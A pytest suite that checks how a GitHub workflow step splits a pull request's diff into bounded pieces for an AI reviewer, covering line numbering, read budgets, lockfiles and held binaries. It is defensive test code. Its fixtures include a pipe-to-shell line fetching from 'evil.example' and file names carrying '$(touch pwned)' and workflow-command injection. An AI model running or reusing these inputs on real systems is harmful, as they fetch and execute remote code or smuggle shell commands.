"""Tests for claude-review.yml's "Write the PR's diff" step, run against real git repos.

The step is inline in the workflow, so its run script (git diff, then the Python
heredoc that splits the diff into pieces) is read out of the file and run with
bash, as the other inline steps' tests do.
"""

import os
import re
import subprocess
import textwrap
from pathlib import Path

import pytest

WORKFLOW = Path(__file__).resolve().parents[2] / "workflows" / "claude-review.yml"

# No user or system config: a global hook, diff or quoting setting mustn't reach these repos.
GIT_ENV = {
    "PATH": os.environ["PATH"],
    "HOME": "/nonexistent",
    "GIT_CONFIG_GLOBAL": os.devnull,
    "GIT_CONFIG_NOSYSTEM": "1",
    "GIT_AUTHOR_NAME": "Test",
    "GIT_AUTHOR_EMAIL": "test@example.com",
    "GIT_COMMITTER_NAME": "Test",
    "GIT_COMMITTER_EMAIL": "test@example.com",
}


def step_script():
    """The run script of the step with id: diff."""
    lines = WORKFLOW.read_text().splitlines()
    step = next(i for i, line in enumerate(lines) if line.strip() == "id: diff")
    start = next(i for i in range(step, len(lines)) if lines[i].strip() == "run: |") + 1
    end = next(i for i in range(start, len(lines)) if lines[i].strip() == "PY") + 1
    return textwrap.dedent("\n".join(lines[start:end])) + "\n"


def constant(name):
    return int(re.search(rf"^\s*{name} = ([\d_]+)", step_script(), re.M)[1].replace("_", ""))


MAX_PIECE_BYTES = constant("MAX_PIECE_BYTES")
MAX_PIECE_LINES = constant("MAX_PIECE_LINES")
MAX_READ_PIECES = constant("MAX_READ_PIECES")
MAX_READ_BYTES = constant("MAX_READ_BYTES")


class Repo:
    def __init__(self, path):
        self.path = path
        path.mkdir()
        self.git("init", "-q", "-b", "main")
        self.git("config", "core.hooksPath", os.devnull)

    def git(self, *args):
        return subprocess.run(["git", *args], cwd=self.path, env=GIT_ENV, capture_output=True, check=True).stdout

    def commit(self, files):
        for name, content in files.items():
            path = self.path / name
            path.parent.mkdir(parents=True, exist_ok=True)
            if content is None:
                path.unlink()
            elif isinstance(content, bytes):
                path.write_bytes(content)
            else:
                path.write_text(content, encoding="utf-8")
        self.git("add", "-A")
        self.git("commit", "-q", "--allow-empty", "-m", "change")
        return self.git("rev-parse", "HEAD").decode().strip()

    def split(self, base, head, tmp_path):
        """Run the step; return (its output's pieces text, the diff folder, the pr.diff bytes)."""
        runner_temp = tmp_path / "runner"
        runner_temp.mkdir()
        output = runner_temp / "output"
        output.write_text("")
        env = {**GIT_ENV, "RUNNER_TEMP": str(runner_temp), "GITHUB_OUTPUT": str(output),
               "BASE_SHA": base, "HEAD_SHA": head}
        done = subprocess.run(["bash", "-e", "-o", "pipefail", "-c", step_script()], cwd=self.path, env=env, check=True,
                              capture_output=True)
        found = re.fullmatch(r"pieces<<(EOF_[0-9a-f]{16})\n(.*)\n\1\nskipped=(.*)\nlisted=(.*)\nhidden=(\d+)\n",
                             output.read_text(), re.S)
        assert found, output.read_text()
        self.skipped, self.listed, self.hidden = found[3], found[4], int(found[5])
        self.log = done.stdout.decode("utf-8", "replace")
        folder = runner_temp / "claude-review" / "diff"
        return found[2], folder, (runner_temp / "claude-review" / "pr.diff").read_bytes()


@pytest.fixture
def repo(tmp_path):
    repo = Repo(tmp_path / "repo")
    repo.base = repo.commit({"README.md": "readme\n"})
    return repo


def index(folder):
    """INDEX's pieces: {name: (lines, read, [(kind, path), ...])}, in order."""
    rows = (folder / "INDEX").read_text(encoding="utf-8").split("\n")[1:-1]
    pieces = {}
    for row in rows:
        if row.startswith("\t"):
            _, kind, path = row.split("\t", 2)
            pieces[name][2].append((kind, path))
        else:
            name, lines, read = row.split("\t")
            pieces[name] = (lines, read, [])
    return pieces


def files_of(folder):
    """{path: (kind, read)} for every file's diff in INDEX, a split file's parts under one path."""
    return {path.split(" (part ")[0]: (kind, read)
            for _, read, files in index(folder).values() for kind, path in files}


def segments(content):
    """Each file's diff in content: (its diff --git line, its body without "(continued)" hunk headers)."""
    found = []
    for line in content.splitlines(keepends=True):
        if line.startswith(b"diff --git "):
            found.append((line, [], [True]))
        elif line.startswith(b"@@"):
            found[-1][2][0] = False
            if not line.endswith(b"@@ (continued)\n"):
                found[-1][1].append(line)
        elif not found[-1][2][0]:
            found[-1][1].append(line)
    return [(key, body) for key, body, _ in found]


def check_pieces(folder, diff):
    """Every piece is within the limits, and together they hold every line of every file's diff, in order."""
    names = sorted(p.name for p in folder.iterdir() if p.name != "INDEX")
    assert names == list(index(folder))
    assert all(re.fullmatch(r"\d{3}\.diff", name) for name in names)
    found = {}
    for name in names:
        content = (folder / name).read_bytes()
        assert len(content) <= MAX_PIECE_BYTES and content.count(b"\n") <= MAX_PIECE_LINES, name
        assert content.startswith(b"diff --git ")
        for key, body in segments(content):
            found.setdefault(key, []).extend(body)
    assert {key: joined(body) for key, body in found.items()} == dict(segments(diff))


def joined(body):
    """body with each long line's later chunks, which may be in the next piece, joined back onto it."""
    lines = []
    for line in body:
        if line.startswith(b"\\~ "):
            lines[-1] = lines[-1][:-1] + line[3:]
        else:
            lines.append(line)
    return lines


def check_line_numbers(folder, repo, head):
    """Every context and added line sits where its hunk headers say, in the head's file."""
    for name in index(folder):
        for key, _ in segments((folder / name).read_bytes()):
            content = (folder / name).read_bytes()
            lines = content[content.index(key):].split(b"\n")
            path = next(line[6:].decode() for line in lines if line.startswith(b"+++ b/"))
            file = repo.git("show", f"{head}:{path}").split(b"\n")
            new = None
            for at, line in enumerate(lines[1:], 1):
                if line.startswith(b"diff --git "):
                    break
                if line.startswith(b"@@"):
                    new = int(re.match(rb"@@ -\d+(?:,\d+)? \+(\d+)", line)[1])
                elif new is not None and line[:1] in (b" ", b"+"):
                    # A long line's first chunk is only the start of it; its later chunks take no number.
                    cut = at + 1 < len(lines) and lines[at + 1].startswith(b"\\~ ")
                    assert file[new - 1].startswith(line[1:]) if cut else file[new - 1] == line[1:], (name, path, new)
                    new += 1


def test_files_are_packed_into_numbered_pieces_in_read_order(repo, tmp_path):
    head = repo.commit({"src/app.py": "print(1)\n", ".github/workflows/ci.yml": "on: push\n",
                        "tests/test_app.py": "def test(): pass\n", "README.md": "readme 2\n",
                        "scripts/build.sh": "make\n"})
    text, folder, diff = repo.split(repo.base, head, tmp_path)
    lines = diff.count(b"\n")
    assert index(folder) == {"001.diff": (f"{lines} lines", "read", [
        ("workflow", ".github/workflows/ci.yml"), ("script", "scripts/build.sh"), ("source", "src/app.py"),
        ("test", "tests/test_app.py"), ("docs", "README.md")])}
    assert text == f"- {folder}/001.diff ({lines} lines: workflow, script, source, test, docs)"
    assert repo.skipped == ""
    check_pieces(folder, diff)


def test_a_big_multi_file_diff_is_covered_whole(repo, tmp_path):
    files = {f"src/module{i}.py": "".join(f"value_{i}_{n} = {n}\n" for n in range(700)) for i in range(4)}
    files["zz/late.yml"] = "".join(f"# step {n}\n" for n in range(1500))
    files[".github/workflows/late.yml"] = "".join(f"# step {n}\n" for n in range(1500))
    head = repo.commit(files)
    text, folder, diff = repo.split(repo.base, head, tmp_path)
    assert len(diff.splitlines()) > 5000
    check_pieces(folder, diff)
    check_line_numbers(folder, repo, head)
    # Every file is in a piece the prompt lists, the workflow, last in the diff, first.
    assert set(files_of(folder)) == set(files)
    assert {read for _, read in files_of(folder).values()} == {"read"}
    assert len(text.splitlines()) == len(index(folder))
    assert next(iter(index(folder).values()))[2][0] == ("workflow", ".github/workflows/late.yml (part 1 of 2)")


def test_a_huge_file_is_split_into_parts_with_their_line_numbers(repo, tmp_path):
    old = "".join(f"line {n}\n" for n in range(6000))
    repo.base = repo.commit({"big.txt": old})
    # One hunk too big for any piece, and several small ones after it.
    new = old.replace("line 10\n", "".join(f"new {n}\n" for n in range(4000)))
    for n in (4000, 4500, 5000, 5500):
        new = new.replace(f"line {n}\n", f"changed {n}\n")
    head = repo.commit({"big.txt": new})
    _, folder, diff = repo.split(repo.base, head, tmp_path)
    parts = [path for _, _, files in index(folder).values() for _, path in files]
    assert len(parts) >= 3
    assert parts == [f"big.txt (part {n} of {len(parts)})" for n in range(1, len(parts) + 1)]
    check_pieces(folder, diff)
    check_line_numbers(folder, repo, head)
    assert any(b"@@ (continued)\n" in (folder / name).read_bytes() for name in index(folder))


def test_a_long_line_is_cut_into_chunks_within_a_piece(repo, tmp_path):
    head = repo.commit({"app.min.css": "a{}" * 30_000, "wide.txt": "\u00e9" * 60_000 + "\n",
                        "yarn.lock": "x\n" * 10})
    _, folder, diff = repo.split(repo.base, head, tmp_path)
    for name in index(folder):
        content = (folder / name).read_bytes()
        assert len(content) <= MAX_PIECE_BYTES
        content.decode("utf-8")  # never cut inside a character
    # Every chunk after a line's first is marked, so none reads as a line of its own.
    wide = next((folder / name).read_bytes() for name, (_, read, _) in index(folder).items() if read == "read")
    rows = wide.split(b"\n")
    first = next(i for i, row in enumerate(rows) if row.startswith(b"+\xc3\xa9"))
    assert all(row.startswith(b"\\~ \xc3\xa9") for row in rows[first + 1:-1])
    check_pieces(folder, diff)
    check_line_numbers(folder, repo, head)
    # Generated files and lockfiles can hold code or point a dependency elsewhere, so they're read while they fit.
    assert repo.skipped == "" and repo.hidden == 0
    assert files_of(folder) == {"wide.txt": ("docs", "read"), "app.min.css": ("generated", "read"),
                                "yarn.lock": ("lockfile", "read")}
    assert repo.listed.split() == list(index(folder))


def test_lines_after_a_long_line_split_across_parts_keep_their_numbers(repo, tmp_path):
    # The long line's chunks run past a piece, so a part opens inside it with a "(continued)" header.
    head = repo.commit({"data.txt": "".join(f"before {n}\n" for n in range(5)) + "x" * 90_000 + "\n"
                        + "".join(f"after {n}\n" for n in range(20))})
    _, folder, diff = repo.split(repo.base, head, tmp_path)
    assert len(index(folder)) > 1
    assert any(b"@@ (continued)\n\\~ " in (folder / name).read_bytes() for name in index(folder))
    check_pieces(folder, diff)
    check_line_numbers(folder, repo, head)


def test_a_rename_a_binary_and_a_deletion(repo, tmp_path):
    repo.base = repo.commit({"old/name.py": "".join(f"x = {n}\n" for n in range(50)), "logo.png": b"\x89PNG\0\1\2",
                             "gone.py": "y = 1\n"})
    head = repo.commit({"old/name.py": None, "new/name.py": "".join(f"x = {n}\n" for n in range(50)),
                        "logo.png": b"\x89PNG\0\3\4", "gone.py": None})
    text, folder, diff = repo.split(repo.base, head, tmp_path)
    # Deleted files come after the rest.
    assert index(folder)["001.diff"][2] == [("source", "logo.png"), ("source", "new/name.py"), ("deleted", "gone.py")]
    content = (folder / "001.diff").read_bytes()
    assert b"Binary files" in content and b"rename to new/name.py" in content
    check_pieces(folder, diff)


def test_an_odd_path_never_names_a_file_nor_reaches_the_prompt(repo, tmp_path):
    odd = "we ird/\u00e9t\u00e9 $(touch pwned) `x` \"q\"\tTAB\nNEWLINE ../..; -rf.py"
    head = repo.commit({odd: "print('hi')\n", "--help": "x\n", "b/ b/x.png": b"\0bin"})
    text, folder, diff = repo.split(repo.base, head, tmp_path)
    assert sorted(p.name for p in folder.iterdir()) == ["001.diff", "INDEX"]
    assert not (repo.path / "pwned").exists() and not (tmp_path / "pwned").exists()
    # INDEX holds each path on one line, as git quotes it.
    assert (folder / "INDEX").read_text(encoding="utf-8").count("\n") == 5
    assert [path for _, path in index(folder)["001.diff"][2]] == [
        "--help", "b/ b/x.png",
        '"we ird/\\303\\251t\\303\\251 $(touch pwned) `x` \\"q\\"\\tTAB\\nNEWLINE ../..; -rf.py"']
    # The prompt's list holds piece names, counts and kinds only.
    assert re.fullmatch(rf"- {re.escape(str(folder))}/001\.diff \(\d+ lines: source\)", text)
    check_pieces(folder, diff)


def test_an_empty_diff(repo, tmp_path):
    head = repo.commit({})
    text, folder, diff = repo.split(repo.base, head, tmp_path)
    assert diff == b""
    assert text == "(none: the diff is empty)"
    assert sorted(p.name for p in folder.iterdir()) == ["INDEX"]
    assert (folder / "INDEX").read_text() == "The diff is empty.\n"


def test_past_the_read_budget_the_rest_are_named_and_workflows_come_first(repo, tmp_path):
    # Each file's diff is about 30 KB, so one fits a piece, and only MAX_READ_PIECES of them are asked for.
    files = {f"docs/f{i:02d}.md": "".join(f"name_{i}_{n} = {n:020d}\n" for n in range(900))
             for i in range(MAX_READ_PIECES + 2)}
    files[".github/workflows/z.yml"] = "".join(f"# {n:028d}\n" for n in range(900))
    files["package-lock.json"] = "{}\n"
    head = repo.commit(files)
    text, folder, _ = repo.split(repo.base, head, tmp_path)
    pieces = index(folder)
    read = [name for name, (_, flag, _) in pieces.items() if flag == "read"]
    assert len(read) == MAX_READ_PIECES
    assert sum((folder / name).stat().st_size for name in read) <= MAX_READ_BYTES
    assert pieces["001.diff"][2] == [("workflow", ".github/workflows/z.yml")]
    unread = {path for _, flag, files in pieces.values() if flag == "not read" for _, path in files}
    assert unread == {"package-lock.json", *(f"docs/f{i:02d}.md" for i in range(MAX_READ_PIECES - 1, MAX_READ_PIECES + 2))}
    listed, _, rest = text.partition("\nNot asked for")
    assert len(listed.splitlines()) == MAX_READ_PIECES
    assert all(name in rest for name, (_, flag, _) in pieces.items() if flag == "not read")
    # Every unread piece, the lockfile's too, is named for the hold; the read ones are listed.
    assert repo.skipped.split() == [name for name, (_, flag, _) in pieces.items() if flag == "not read"]
    assert repo.listed.split() == read


def test_a_lockfile_is_read_last_and_holds_the_merge_past_the_budget(repo, tmp_path):
    lock = "".join(f'"node_modules/p{n}": {{"resolved": "https://registry.example/p{n}-{n:020d}.tgz"}}\n'
                   for n in range(MAX_READ_BYTES // 60))
    head = repo.commit({"src/app.py": "print(2)\n", "package-lock.json": lock})
    _, folder, _ = repo.split(repo.base, head, tmp_path)
    pieces = index(folder)
    assert pieces["001.diff"][2][0] == ("source", "src/app.py")
    assert all(files[-1][0] == "lockfile" for name, (_, _, files) in pieces.items() if name != "001.diff")
    assert repo.listed.split()[0] == "001.diff"
    # Past the budget, the lockfile's pieces are named for the hold.
    assert repo.skipped and all({kind for kind, _ in pieces[name][2]} == {"lockfile"} for name in repo.skipped.split())


def test_the_heads_gitattributes_cant_hide_its_code(repo, tmp_path):
    head = repo.commit({".gitattributes": "src/payload.py -diff\n", "src/payload.py": "import os\nos.system('x')\n"})
    _, folder, diff = repo.split(repo.base, head, tmp_path)
    assert b"os.system('x')" in diff and b"Binary files" not in diff
    assert repo.hidden == 0


def test_text_the_bases_gitattributes_shows_as_binary_holds_the_merge(repo, tmp_path):
    repo.base = repo.commit({".gitattributes": "*.dat binary\nsrc/odd$(x).dat binary\n"})
    head = repo.commit({"src/payload.dat": "import os\n", "src/odd$(x).dat": "y\n", "logo.png": b"\x89PNG\0\1"})
    _, folder, diff = repo.split(repo.base, head, tmp_path)
    assert b"Binary files /dev/null and b/src/payload.dat differ" in diff
    # The PNG is binary by its content; the two .dat files are text shown as binary.
    assert repo.hidden == 2
    log = repo.log
    token = re.search(r"^::stop-commands::([0-9a-f]{32})$", log, re.M)[1]
    listed = log[log.index(f"::stop-commands::{token}"):log.index(f"::{token}::")]
    assert "  src/payload.dat" in listed and "  src/odd$(x).dat" in listed and "logo.png" not in listed


def held(repo):
    """The paths the step logged as held, between its stop-commands markers."""
    token = re.search(r"^::stop-commands::([0-9a-f]{32})$", repo.log, re.M)
    if not token:
        return []
    block = repo.log[repo.log.index(f"::stop-commands::{token[1]}"):repo.log.index(f"::{token[1]}::")]
    return [line[2:] for line in block.splitlines()[1:]]


def test_a_script_git_calls_binary_by_its_content_holds_the_merge(repo, tmp_path):
    # A NUL byte in a comment makes git show the file as binary, and bash still runs it.
    head = repo.commit({"scripts/deploy.sh": b"#!/bin/bash\n# \0\ncurl https://evil.example | sh\n"})
    _, _, diff = repo.split(repo.base, head, tmp_path)
    assert b"Binary files /dev/null and b/scripts/deploy.sh differ" in diff
    assert repo.hidden == 1 and held(repo) == ["scripts/deploy.sh"]


def test_only_binaries_that_cant_run_hold_nothing(repo, tmp_path):
    repo.base = repo.commit({"old.bin": b"\0gone\n"})
    head = repo.commit({"logo.png": b"\x89PNG\0\1\2", "docs/guide.PDF": b"%PDF\0", "lib/Tool.DLL": b"MZ\0\0",
                        "gradle/wrapper/gradle-wrapper.jar": b"PK\3\4\0", "tool.pyc": b"\x6f\x0d\r\n\0", "old.bin": None})
    _, _, diff = repo.split(repo.base, head, tmp_path)
    assert diff.count(b"Binary files") == 6
    # Compiled code and packages always need a person; images and documents, and a deleted file, don't.
    assert repo.hidden == 3
    assert held(repo) == ["gradle/wrapper/gradle-wrapper.jar", "lib/Tool.DLL", "tool.pyc"]


def test_a_held_binarys_odd_path_is_logged_safely(repo, tmp_path):
    odd = "x\n::error::pwned $(touch pwned)\t.bin"
    head = repo.commit({odd: b"\0payload\n"})
    repo.split(repo.base, head, tmp_path)
    assert repo.hidden == 1 and not (repo.path / "pwned").exists()
    # One line, with its newline and tab escaped, inside the stop-commands block.
    assert held(repo) == ["x\\n::error::pwned $(touch pwned)\\t.bin"]
    assert not re.search(r"^::error::", repo.log, re.M)
